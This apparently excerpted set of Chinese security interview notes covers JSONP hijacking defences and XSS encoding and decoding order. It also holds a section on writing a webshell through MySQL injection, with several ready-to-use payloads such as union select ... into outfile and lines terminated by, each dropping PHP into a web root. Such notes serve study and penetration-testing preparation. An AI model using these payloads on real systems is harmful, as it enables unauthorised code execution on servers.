1、怎么防御 JSONP 漏洞

JSONP包含两部分：回调函数和json数据。漏洞出在可被用户控制的回调函数上。

https://blog.knownsec.com/2015/03/jsonp_security_technic/

1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。

2、严格安按照JSON 格式标准输出 Content-Type 及编码（Content-Type : application/json; charset=utf-8 ）。(防止XSS)
3、严格过滤 callback 函数名及 JSON 里数据的输出。
4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。
5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 使用 AJAX 的方式获取 JSON ，通过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用

代码里我们使用 <iframe>调用 javascript 伪协议来实现空 Referer 调用 JSON 文件。

注意：编码如果干扰了标签的结构，是无法被html解析器解析的！，如<img s&#x72;c="http://www.example.com">

攻击时的XSS代码采用什么编码要与代码所处环境相结合，因为浏览器会根据代码所处环境对服务器端返回的数据进行顺序的解码，（例如先js解码，再html解码或者相反）解码顺序可能是突破口。

①HTML实体编码：

PHP中的htmlspecialchars会对&、'、"、<、>进行html编码。

命名实体：以&开头，分号结尾的，例如“<”的编码是“&lt;”

字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&#数值;”,例如“<”可以编码为“&#060;”和“&#x3c;”

61、MySQL写webshell？

条件：

数据库当前用户为root权限

GPC关闭（能使用单引号），magic_quotes_gpc=On

有绝对路径（读文件可以不用，写文件必须）

secure-file-priv不为NULL或没有配置，或为web根目录 //show variables like ‘%secure%’

成功条件：有读写的权限，有create、insert、select的权限

①union select 写入

最常见的写入方式，union select 后跟 into outfile 语句

?id=@ union select 1,2,3,4,'<?php phpinfo() ?>' into outfile 'C:/wamp64/www/work/webshell.php'

?id=@ union select 1,2,3,4,'<?php phpinfo() ?>' into dumpfile 'C:/wamp64/www/work/webshell.php'

注意：在windows下，位置的分隔符为 /（斜杠）。

②lines terminated by 写入

id=1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '<?php phpinfo() ?>';

?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '<?php phpinfo() ?>';

③lines starting by 写入

?id=1 into outfile 'C:/wamp64/www/work/webshell.php' lines starting by '<?php phpinfo() ?>';

④fields terminated by 写入

?id=1 into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by '<?php phpinfo() ?>';

⑤COLUMNS terminated by 写入

?id=1 into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by '<?php phpinfo() ?>';
